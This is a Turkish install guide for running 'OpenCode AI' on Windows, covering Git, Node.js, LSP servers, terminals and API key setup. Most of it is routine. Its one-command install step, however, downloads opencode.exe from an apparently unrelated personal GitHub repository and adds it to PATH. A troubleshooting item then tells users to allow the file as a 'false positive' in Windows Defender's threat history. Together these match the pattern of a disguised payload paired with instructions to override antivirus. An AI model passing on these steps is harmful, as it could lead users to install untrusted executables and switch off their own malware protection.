# OpenCode AI - Windows 10 Bağımlılıkları

Bu belge, OpenCode AI'ın Windows 10 terminalde düzgün çalışması için gereken tüm bağımlılıkları listeler.

## 🔧 Zorunlu Bağımlılıklar

### 1. Git

Version control ve repository işlemleri için gereklidir. OpenCode, proje dosyalarını taramak ve değişiklikleri izlemek için Git kullanır.

```powershell
# Winget ile kurulum
winget install Git.Git

# Veya Chocolatey ile
choco install git

# Veya manuel indir
# https://git-scm.com/download/win
```

**Doğrulama:**
```powershell
git --version
# Çıktı: git version 2.43.0.windows.1
```

---

## 📦 Önerilen Bağımlılıklar

### 2. Node.js 18+

OpenCode, bazı özellikler için Node.js gerektirir. Özellikle:
- npm paket yönetimi
- JavaScript/TypeScript LSP sunucuları
- Özel script'ler

```powershell
# Winget ile kurulum
winget install OpenJS.NodeJS.LTS

# Veya Chocolatey ile
choco install nodejs-lts

# Veya manuel indir
# https://nodejs.org/
```

**Doğrulama:**
```powershell
node --version
# Çıktı: v20.11.0

npm --version
# Çıktı: 10.2.4
```

### 3. PowerShell 7+

Windows PowerShell 5.1 yerine PowerShell 7+ kullanmanız önerilir. Daha iyi performans ve özellikler sunar.

```powershell
# Winget ile kurulum
winget install Microsoft.PowerShell

# Veya MSI indir
# https://github.com/PowerShell/PowerShell/releases
```

**Doğrulama:**
```powershell
$PSVersionTable.PSVersion
# Çıktı: 7.4.1
```

---

## 🔌 LSP Sunucuları

OpenCode, LSP sunucularını **otomatik olarak** indirip yönetir. Ancak manuel kurulum isterseniz:

### JavaScript/TypeScript

```powershell
npm install -g typescript typescript-language-server
```

| Dosya Uzantısı | LSP Sunucusu |
|----------------|--------------|
| `.js`, `.jsx` | typescript-language-server |
| `.ts`, `.tsx` | typescript-language-server |

### Python

```powershell
pip install pyright
# veya
pip install python-lsp-server
```

| Dosya Uzantısı | LSP Sunucusu |
|----------------|--------------|
| `.py` | pyright / pylsp |

### Go

```powershell
go install golang.org/x/tools/gopls@latest
```

| Dosya Uzantısı | LSP Sunucusu |
|----------------|--------------|
| `.go` | gopls |

### Rust

```powershell
rustup component add rust-analyzer
```

| Dosya Uzantısı | LSP Sunucusu |
|----------------|--------------|
| `.rs` | rust-analyzer |

### C/C++

```powershell
# LLVM/Clang kurulumu
winget install LLVM.LLVM
```

| Dosya Uzantısı | LSP Sunucusu |
|----------------|--------------|
| `.c`, `.h` | clangd |
| `.cpp`, `.hpp` | clangd |

---

## 🖥️ Terminal Önerileri

### Windows Terminal (Önerilen)

Modern sekmeli terminal deneyimi.

```powershell
winget install Microsoft.WindowsTerminal
```

**Özellikler:**
- Sekme desteği
- Bölünmüş paneller
- GPU render
- Profil yönetimi

### Alacritty

Hızlı, GPU tabanlı terminal.

```powershell
winget install Alacritty.Alacritty
```

### WezTerm

Çok özellikli, çoklu platform terminal.

```powershell
winget install wez.wezterm
```

---

## 🔑 API Anahtarları

OpenCode'u kullanmak için **en az bir** AI sağlayıcısının API anahtarına ihtiyacınız vardır.

| Sağlayıcı | Çevre Değişkeni | Başvuru Linki | Ücretsiz Deneme |
|-----------|-----------------|---------------|-----------------|
| Anthropic | `ANTHROPIC_API_KEY` | https://console.anthropic.com | $5 kredi |
| OpenAI | `OPENAI_API_KEY` | https://platform.openai.com | $18 kredi |
| Google | `GEMINI_API_KEY` | https://aistudio.google.com | Ücretsiz |
| Groq | `GROQ_API_KEY` | https://console.groq.com | Ücretsiz |
| GitHub Copilot | `GITHUB_TOKEN` | https://github.com/settings/tokens | Copilot aboneliği |

### API Anahtarı Ayarlama

```powershell
# Geçici (oturum süresince)
$env:ANTHROPIC_API_KEY = "sk-ant-api03-your-key-here"

# Kalıcı (kullanıcı seviyesinde)
[Environment]::SetEnvironmentVariable("ANTHROPIC_API_KEY", "your-key", "User")

# Tüm sağlayıcıları ayarla
[Environment]::SetEnvironmentVariable("ANTHROPIC_API_KEY", "your-key", "User")
[Environment]::SetEnvironmentVariable("OPENAI_API_KEY", "your-key", "User")
[Environment]::SetEnvironmentVariable("GEMINI_API_KEY", "your-key", "User")
```

---

## 📋 Kurulum Kontrol Listesi

Bu script ile tüm bağımlılıkları kontrol edebilirsiniz:

```powershell
Write-Host "=== OpenCode Bağımlılık Kontrolü ===" -ForegroundColor Cyan
Write-Host ""

# Git kontrol
if (Get-Command git -ErrorAction SilentlyContinue) {
    Write-Host "[OK] Git: $(git --version)" -ForegroundColor Green
} else {
    Write-Host "[EKSİK] Git kurulu değil!" -ForegroundColor Red
    Write-Host "      Kurulum: winget install Git.Git" -ForegroundColor Yellow
}

# Node.js kontrol
if (Get-Command node -ErrorAction SilentlyContinue) {
    Write-Host "[OK] Node.js: $(node --version)" -ForegroundColor Green
    Write-Host "[OK] npm: $(npm --version)" -ForegroundColor Green
} else {
    Write-Host "[OPSİYONEL] Node.js kurulu değil" -ForegroundColor Yellow
}

# PowerShell sürümü
Write-Host "[INFO] PowerShell: $($PSVersionTable.PSVersion)" -ForegroundColor Cyan

# API Anahtarları
$hasKey = $false
$keys = @{
    "ANTHROPIC_API_KEY" = "Anthropic"
    "OPENAI_API_KEY" = "OpenAI"
    "GEMINI_API_KEY" = "Google Gemini"
    "GROQ_API_KEY" = "Groq"
}

Write-Host ""
Write-Host "API Anahtarları:" -ForegroundColor Cyan
foreach ($key in $keys.Keys) {
    $value = [Environment]::GetEnvironmentVariable($key, "User")
    if ($value) {
        Write-Host "[OK] $keys[$key] ayarlanmış" -ForegroundColor Green
        $hasKey = $true
    } else {
        Write-Host "[--] $keys[$key] ayarlanmamış" -ForegroundColor Gray
    }
}

if (-not $hasKey) {
    Write-Host ""
    Write-Host "[UYARI] Hiçbir API anahtarı ayarlanmamış!" -ForegroundColor Yellow
    Write-Host "       OpenCode düzgün çalışmayabilir." -ForegroundColor Yellow
}

# OpenCode kontrol
Write-Host ""
if (Get-Command opencode -ErrorAction SilentlyContinue) {
    Write-Host "[OK] OpenCode PATH'te bulunuyor" -ForegroundColor Green
} else {
    $localPath = "$env:LOCALAPPDATA\opencode-ai\opencode.exe"
    if (Test-Path $localPath) {
        Write-Host "[INFO] OpenCode kurulu ama PATH'te değil" -ForegroundColor Yellow
        Write-Host "      Konum: $localPath" -ForegroundColor Gray
    } else {
        Write-Host "[EKSİK] OpenCode kurulu değil" -ForegroundColor Red
    }
}

Write-Host ""
Write-Host "================================" -ForegroundColor Gray
```

---

## ⚡ Tek Komutla Kurulum

Tüm bağımlılıkları tek seferde kurmak için:

```powershell
# Yönetici olarak çalıştırın!

# Git
winget install Git.Git --accept-source-agreements --accept-package-agreements

# Node.js
winget install OpenJS.NodeJS.LTS --accept-source-agreements --accept-package-agreements

# Windows Terminal
winget install Microsoft.WindowsTerminal --accept-source-agreements --accept-package-agreements

# OpenCode
$installPath = "$env:LOCALAPPDATA\opencode-ai"
New-Item -ItemType Directory -Force -Path $installPath
Invoke-WebRequest -Uri "https://github.com/saro2025sq/BasProject/releases/download/v1.2.15/opencode.exe" -OutFile "$installPath\opencode.exe"
[Environment]::SetEnvironmentVariable("PATH", $env:PATH + ";$installPath", "User")

Write-Host "Kurulum tamamlandı! Terminali yeniden açın." -ForegroundColor Green
```

---

## 🐛 Sorun Giderme

### "opencode" komutu bulunamadı

```powershell
# PATH'i güncelle
$env:PATH += ";$env:LOCALAPPDATA\opencode-ai"

# Veya kalıcı olarak
[Environment]::SetEnvironmentVariable("PATH", $env:PATH + ";$env:LOCALAPPDATA\opencode-ai", "User")

# Terminali yeniden açın
```

### LSP sunucusu çalışmıyor

```powershell
# LSP otomatik indirmeyi etkinleştir
$env:OPENCODE_DISABLE_LSP_DOWNLOAD = "false"

# Veya kalıcı
[Environment]::SetEnvironmentVariable("OPENCODE_DISABLE_LSP_DOWNLOAD", "false", "User")
```

### Git SSL hatası

```powershell
git config --global http.sslBackend schannel
```

### PowerShell execution policy hatası

```powershell
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned
```

### Antivirus engellemesi

Windows Defender veya diğer antivirüs programları `opencode.exe`'yi engelleyebilir:

1. Windows Security > Virus & threat protection
2. Protection history > Threat history
3. Allow the threat (False positive)

---

## 📁 Dosya Konumları

| Dosya | Konum |
|-------|-------|
| OpenCode Binary | `%LOCALAPPDATA%\opencode-ai\opencode.exe` |
| Konfigürasyon | `%USERPROFILE%\.opencode.json` |
| Veri Dizini | `.opencode\` (proje içinde) |
| Log Dosyaları | `.opencode\debug.log` |

---

## 📚 İlgili Dosyalar

- [README-TR.md](./README-TR.md) - Ana kullanım kılavuzu
- [install-all-dependencies.ps1](./install-all-dependencies.ps1) - Otomatik kurulum script'i
- [opencode-config-example.json](./opencode-config-example.json) - Örnek konfigürasyon
